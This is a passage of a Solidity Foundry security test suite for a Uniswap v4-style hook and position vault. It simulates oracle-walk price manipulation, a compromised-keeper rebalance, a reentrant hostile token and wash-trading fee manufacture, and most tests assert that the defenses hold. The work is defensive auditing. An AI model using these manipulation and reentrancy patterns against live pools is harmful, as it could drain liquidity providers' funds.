                zeroForOne: true,
                amountSpecified: -5_000e18,
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(parkTick)
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );
        _advance(D_TWAP_WINDOW + 60);
        assertEq(hook.consult(pid, D_TWAP_WINDOW), parkTick, "TWAP did not follow");

        uint256 snap = vm.snapshotState();
        (uint256 c0,) = _grossExitFrom(tight, alice, id);
        vm.revertToState(snap);

        // The 5% ejection cap does not refuse it: the burn is one-sided, so nothing is "handed back".
        vm.prank(DEPLOYER);
        tight.rebalance(id, lo, hi);
        assertEq(tight.getPosition(id).tickLower, lo, "the ejection cap refused the wick rebalance");

        _advance(61);
        vm.prank(jit);
        swapRouter.swap(
            pk,
            SwapParams({zeroForOne: false, amountSpecified: -1e18, sqrtPriceLimitX96: MAX_PRICE_LIMIT}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );
        (uint256 a0,) = _grossExitFrom(tight, alice, id);

        console2.log("C10 with a 5% ejection cap, control recovery :", c0);
        console2.log("C10 with a 5% ejection cap, attacked recovery:", a0);
        assertLt(a0, c0 / 1000, "the ejection cap saved the principal");
    }

    /* ================================================================== C11 =======
       ROOT-CAUSE CONTROL. The walk is only free because the pool has nothing left to arbitrage against,
       and that is a consequence of MoleHook's own `restrictedLiquidity`: the vault's concentrated
       positions are the whole book. Put an ordinary deep LP in the same pool and the identical sweep
       cannot reach the parking tick at all.
       ============================================================================== */

    function test_C11_aDeepBookMakesTheIdenticalWalkUnreachable() public {
        // The operator allowlists a normal wide-range LP alongside the vault.
        hook.setLiquidityAllowed(address(modifyLiquidityRouter), true);
        modifyLiquidityRouter.modifyLiquidity(
            pk,
            ModifyLiquidityParams({tickLower: -60_000, tickUpper: 60_000, liquidityDelta: 5_000e18, salt: 0}),
            ZERO_BYTES
        );
        _open(positions, pk, alice, -600, 600, 20_000e18);

        int24 parkTick = -200_100;
        _advance(61);
        vm.prank(jit);
        swapRouter.swap(
            pk,
            SwapParams({
                zeroForOne: true,
                amountSpecified: -5_000e18,
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(parkTick)
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );
        (, int24 reached,,) = StateLibrary.getSlot0(manager, pid);
        console2.log("C11 tick reached against a deep book:", int256(reached));
        assertGt(reached, parkTick, "the identical sweep still reached the parking tick");
        assertGt(StateLibrary.getLiquidity(manager, pid), 0, "the book was emptied anyway");
    }

    /* ================================================================== C12 =======
       SCOPE OF THE KEY. C9 ran the rebalance from the shipped default key, which is also the hook's
       poolCreator. Prove the attack needs NOTHING but the keeper key: a keeper that holds no hook
       power at all, and an unprivileged swapper, are jointly sufficient.
       ============================================================================== */

    function test_regression_C12_theKeeperKeyAloneIsNoLongerEnough() public {
        address mallory = makeAddr("mallory");
        MolePositions sep = deployMoleVault(
            manager, mallory, D_MIN_REBAL, D_MIN_W, D_MAX_W, address(hook),
            D_MAX_TWAP_DEV, D_TWAP_WINDOW, D_DWELL, D_BUDGET, D_EJECT, D_MAX_RECENTER
        , 0, address(0));
        hook.setLiquidityAllowed(address(sep), true); // the honest operator does this once, at deploy
        sep.whitelistPool(pk);
        _approve(alice, address(sep));

        assertTrue(mallory != hook.poolCreator(), "the keeper must not be the pool creator here");
        assertFalse(hook.liquidityAllowed(mallory), "the keeper must hold no hook power");

        uint256 id = _open(sep, pk, alice, -600, 600, 20_000e18);
        _advance(2 days);

        int24 parkTick = -200_100;
        _advance(61);
        vm.prank(jit); // an ordinary address, no keys, no allowlist
        swapRouter.swap(
            pk,
            SwapParams({
                zeroForOne: true,
                amountSpecified: -5_000e18,
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(parkTick)
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );
        _advance(D_TWAP_WINDOW + 60);

        uint256 snap = vm.snapshotState();
        (uint256 c0,) = _grossExitFrom(sep, alice, id);
        vm.revertToState(snap);

        /* ---- THE FIX. The keeper key alone was enough because every bound it faced was either
                oracle-anchored (and the oracle had just been walked for free by an unprivileged address)
                or about width and timing. `maxRecenterTicks` is neither: it compares the new range to
                the position's EXISTING range and reads no price, so a compromised keeper cannot follow
                a walked anchor however far it goes. */
        vm.prank(mallory);
        vm.expectRevert(MolePositions.RecenterTooFar.selector);
        sep.rebalance(id, -199_980, -199_860);

        // Nothing moved, and the owner's principal is exactly what the control said it would be.
        assertEq(sep.getPosition(id).tickLower, -600, "the position moved despite the refusal");
        (uint256 a0,) = _grossExitFrom(sep, alice, id);
        console2.log("C12 control principal :", c0);
        console2.log("C12 post-fix principal:", a0);
        assertEq(a0, c0, "the owner's principal changed - the keeper key still moves value");
    }

    /* ================================================================== C13 =======
       REENTRANCY ACROSS THE SEAM. The hook runs inside somebody's unlock. Give it a token that hands
       control back to arbitrary code from inside the hook's own `poolManager.take`, and try to reach
       every state-changing entry point on the vault from there, while a real position is live.
       ============================================================================== */

    function test_C13_hookSideCallbackCannotReachIntoTheVault() public {
        // A hostile currency, and a hook that will hand it control by taking a fee to `feeRecipient`.
        ReentrantToken hostile = new ReentrantToken();
        MockERC20 plain = new MockERC20("plain", "PLN", 18);

        (Currency c0, Currency c1) = address(hostile) < address(plain)
            ? (Currency.wrap(address(hostile)), Currency.wrap(address(plain)))
            : (Currency.wrap(address(plain)), Currency.wrap(address(hostile)));

        MoleHook feeHook = _deployHookFor(manager, 9, DEPLOYER, false, 10_000); // 1%, the cap
        PoolKey memory k = PoolKey({
            currency0: c0, currency1: c1, fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
            tickSpacing: SPACING, hooks: IHooks(address(feeHook))
        });
        manager.initialize(k, SQRT_PRICE_1_1);

        MolePositions v = deployMoleVault(
            manager, DEPLOYER, D_MIN_REBAL, D_MIN_W, D_MAX_W, address(feeHook), 0, 0, 0, 0, D_EJECT
        , 0, 0, address(0));
        v.whitelistPool(k);

        hostile.mint(address(this), 1_000_000e18);
        hostile.mint(alice, 1_000_000e18);
        plain.mint(address(this), 1_000_000e18);
        plain.mint(alice, 1_000_000e18);
        hostile.approve(address(v), type(uint256).max);
        plain.approve(address(v), type(uint256).max);
        hostile.approve(address(swapRouter), type(uint256).max);
        plain.approve(address(swapRouter), type(uint256).max);
        vm.startPrank(alice);
        hostile.approve(address(v), type(uint256).max);
        plain.approve(address(v), type(uint256).max);
        vm.stopPrank();

        vm.prank(alice);
        uint256 id = v.open(k, -6_000, 6_000, 20_000e18, type(uint256).max, type(uint256).max, block.timestamp);
        uint128 liqBefore = v.getPosition(id).liquidity;

        // Arm the token: every transfer now tries every door on the vault.
        hostile.arm(address(v), id, k);

        _advance(61);
        swapRouter.swap(
            k,
            SwapParams({zeroForOne: true, amountSpecified: -50e18, sqrtPriceLimitX96: MIN_PRICE_LIMIT}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );

        assertGt(hostile.attempts(), 0, "the hostile token never got control from inside the hook");
        assertEq(hostile.opens(), 0, "a reentrant open() succeeded from inside the hook callback");
        assertEq(hostile.withdraws(), 0, "a reentrant withdraw() succeeded from inside the hook callback");
        assertEq(hostile.rebalances(), 0, "a reentrant rebalance() succeeded from inside the hook callback");
        assertEq(v.getPosition(id).liquidity, liqBefore, "the position was mutated from the hook side");
        assertEq(v.ownerOf(id), alice, "the owner was mutated from the hook side");

        hostile.disarm();
        vm.prank(alice);
        v.withdrawAll(id);
        assertEq(v.getPosition(id).liquidity, 0, "the exit did not survive the hostile currency");
    }

    /* ================================================================== C14 =======
       THE SEAM THE VOLATILITY-SCALED FEE DIED ON, RE-RUN AGAINST WHAT SHIPPED.

       The fee used to be derived from the pool's own realised volatility, and the objection that killed it
       is a COMPOSITION objection, which is why it is re-asserted here and not only in the hook's own file:
       the party that COLLECTS the surcharge is the party that can MANUFACTURE the signal it is derived
       from. `restrictedLiquidity` makes the vault the whole book, so whoever holds the dominant position in
       the band all the flow crosses collects nearly all of the surcharge — and C1 already proved that
       "whoever" is unconstrained, because the vault the hook is REQUIRED to allowlist admits anyone. The
       measured result was an attacker wash-trading the surcharge to its ceiling inside one block at base
       fee and then collecting it from third-party flow: attacker +114.9e18, third-party swappers -170.0e18.

       WHY THIS TEST HAS THIS SHAPE. The attack machinery is kept in full — unlisted attacker, vault route,
       dominant position, intra-block wash volume, third-party flow behind it — because the machine still
       runs. What changed is that it has nothing to move: `lpFeePips` is immutable, beforeSwap re-asserts it
       with OVERRIDE_FEE_FLAG on every swap, and there is no accumulator left to feed. So the assertion is
       not "the surcharge is smaller" but "the surcharge does not exist", stated two ways: the quoted fee
       never moves, and third-party flow behind the wash pays EXACTLY what it would have paid in front of
       it — compared bit-for-bit at the same price, against the same depth, in two branches of one snapshot.
       ============================================================================== */

    function test_C14_theVaultsDominantLpCannotManufactureAFeeAnyMore() public {
        uint256 aliceId = _open(positions, pk, alice, -600, 600, 20_000e18);

        uint24 feeAtRest = hook.currentFee(pid);
        (,,, uint24 storedAtRest) = StateLibrary.getSlot0(manager, pid);
        assertEq(feeAtRest, D_LP_FEE, "precondition: the pool does not start at the shipped fee");

        uint256 snap = vm.snapshotState();

        /* ---- CONTROL. Third-party flow with no manufacture in front of it. */
        uint256 controlOut = _thirdPartyFlow(pk);

        vm.revertToState(snap);

        /* ---- ATTACK. The address the hook never allowlisted becomes the dominant LP through the vault
                (C1's bypass), then wash-trades in a SINGLE block — no _advance anywhere below, which is
                what the old decay could not see through. */
        assertFalse(hook.liquidityAllowed(jit), "precondition: jit must not be on the hook's allowlist");
        uint256 jitId = _open(positions, pk, jit, -600, 600, 2_000_000e18);
        assertGt(
            positions.getPosition(jitId).liquidity,
            positions.getPosition(aliceId).liquidity * 50,
            "harness: the attacker is not the dominant LP, so it would not collect the surcharge"
        );

        for (uint256 i = 0; i < 60; i++) {
            vm.prank(jit);
            _swap(i % 2 == 0, 200e18);
            assertEq(hook.currentFee(pid), feeAtRest, "a wash swap moved the quoted fee");
        }

        // Give it back the exact starting price, so the comparison below is depth-for-depth and
        // price-for-price rather than a composition artefact.
        _restoreToParity();
        (uint160 spAfterWash,,, uint24 storedAfterWash) = StateLibrary.getSlot0(manager, pid);
        assertEq(spAfterWash, SQRT_PRICE_1_1, "harness: the wash did not end at the control's price");
        assertEq(storedAfterWash, storedAtRest, "the wash moved the fee stored in the PoolManager");

        // The collection step: the attacker steps out of the way and lets third-party flow arrive. Under
        // the old design this is where the manufactured surcharge was harvested; the position is burnt
        // first so the flow below meets exactly the control's depth.
        vm.prank(jit);
        positions.withdrawAll(jitId);
        assertEq(StateLibrary.getLiquidity(manager, pid), 20_000e18, "harness: depth differs from the control");
        assertEq(hook.currentFee(pid), feeAtRest, "the fee moved once the manufactured position left");

        uint256 attackedOut = _thirdPartyFlow(pk);

        console2.log("C14 third-party output, no wash  :", controlOut);
        console2.log("C14 third-party output, post-wash:", attackedOut);
        assertEq(attackedOut, controlOut, "third-party flow paid a different rate after the wash");
        assertEq(hook.currentFee(pid), feeAtRest, "the fee moved across the whole attack");

        vm.prank(alice);
        positions.withdrawAll(aliceId);
    }

    /// @notice NEGATIVE CONTROL for C14. `assertEq(attackedOut, controlOut)` is only evidence if the number
    ///         being compared can move at all — a probe that is blind to the fee would pass C14 no matter
    ///         what the hook did. So run the identical probe against an identical pool (same depth, same
    ///         parity price, same everything) whose hook was deployed at a DIFFERENT immutable fee, and
    ///         require the answer to differ. If this test ever fails, C14 is vacuous and must be believed.
    function test_C14b_theThirdPartyProbeMovesWhenTheLpFeeGenuinelyDiffers() public {
        _open(positions, pk, alice, -600, 600, 20_000e18);
        uint256 atShippedFee = _thirdPartyFlow(pk);

        MoleHook cheap = _deployHookAtFee(4242, 500); // 0.05% instead of 0.30%
        MolePositions v = deployMoleVault(
            manager, DEPLOYER, D_MIN_REBAL, D_MIN_W, D_MAX_W, address(cheap),
            D_MAX_TWAP_DEV, D_TWAP_WINDOW, D_DWELL, D_BUDGET, D_EJECT, D_MAX_RECENTER
        , 0, address(0));
        cheap.setLiquidityAllowed(address(v), true);

        PoolKey memory k = PoolKey({
            currency0: currency0,
            currency1: currency1,
            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
            tickSpacing: SPACING,
            hooks: IHooks(address(cheap))
        });
        manager.initialize(k, SQRT_PRICE_1_1);
        v.whitelistPool(k);
        _approve(alice, address(v));
        vm.prank(alice);
        v.open(k, -600, 600, 20_000e18, type(uint256).max, type(uint256).max, block.timestamp);

        assertEq(cheap.currentFee(k.toId()), 500, "the cheap pool is not actually cheaper");
        uint256 atCheapFee = _thirdPartyFlow(k);

        console2.log("C14b third-party output at 3000 pips:", atShippedFee);
        console2.log("C14b third-party output at  500 pips:", atCheapFee);
        assertGt(atCheapFee, atShippedFee, "the probe is blind to the LP fee - C14's equality proves nothing");
    }

    /// @dev One fixed third-party swap, measured as what the swapper actually receives. Bob holds no keys,
    ///      no allowlist entry and no position; he is the flow the surcharge used to be collected from.
    function _thirdPartyFlow(PoolKey memory k) internal returns (uint256 received) {
        uint256 before = MockERC20(Currency.unwrap(currency1)).balanceOf(bob);
        vm.prank(bob);
        swapRouter.swap(
            k,
            SwapParams({zeroForOne: true, amountSpecified: -100e18, sqrtPriceLimitX96: MIN_PRICE_LIMIT}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ZERO_BYTES
        );
        received = MockERC20(Currency.unwrap(currency1)).balanceOf(bob) - before;
    }

    function _grossExitFrom(MolePositions m, address who, uint256 id) internal returns (uint256 d0, uint256 d1) {
        uint256 b0 = MockERC20(Currency.unwrap(currency0)).balanceOf(who);
        uint256 b1 = MockERC20(Currency.unwrap(currency1)).balanceOf(who);
        vm.prank(who);
        m.withdrawAll(id);
        d0 = MockERC20(Currency.unwrap(currency0)).balanceOf(who) - b0;
        d1 = MockERC20(Currency.unwrap(currency1)).balanceOf(who) - b1;
    }

    /// @dev Gross tokens the exit itself pays out, measured across the withdrawAll call alone.
    function _grossExit(address who, uint256 id) internal returns (uint256 d0, uint256 d1) {
        uint256 b0 = MockERC20(Currency.unwrap(currency0)).balanceOf(who);
        uint256 b1 = MockERC20(Currency.unwrap(currency1)).balanceOf(who);
        vm.prank(who);
        positions.withdrawAll(id);
        d0 = MockERC20(Currency.unwrap(currency0)).balanceOf(who) - b0;
        d1 = MockERC20(Currency.unwrap(currency1)).balanceOf(who) - b1;
    }
}

/// @notice A currency that hands control to arbitrary code on every transfer, so the vault can be
///         attacked from inside the HOOK's callback rather than from inside the vault's own unlock.
contract ReentrantToken is MockERC20 {
    MolePositions internal vault;
    uint256 internal victimId;
    PoolKey internal key;
    bool internal armed;

    uint256 public attempts;
    uint256 public opens;
    uint256 public withdraws;
    uint256 public rebalances;

    constructor() MockERC20("hostile", "HST", 18) {}

    function arm(address v, uint256 id, PoolKey memory k) external {
        vault = MolePositions(v);
        victimId = id;
        key = k;
        armed = true;
    }

    function disarm() external {
        armed = false;
    }

    function _knock() internal {
        if (!armed) return;
        armed = false; // one shot per transfer, so the probe cannot recurse forever
        attempts++;

        try vault.open(key, -600, 600, 1e18, type(uint256).max, type(uint256).max, block.timestamp) {
            opens++;
        } catch {}
        try vault.withdrawAll(victimId) {
            withdraws++;
        } catch {}
        try vault.rebalance(victimId, -1200, 1200) {
            rebalances++;
        } catch {}

        armed = true;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        bool ok = super.transfer(to, amount);
        _knock();
        return ok;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        bool ok = super.transferFrom(from, to, amount);
        _knock();
        return ok;
    }
}
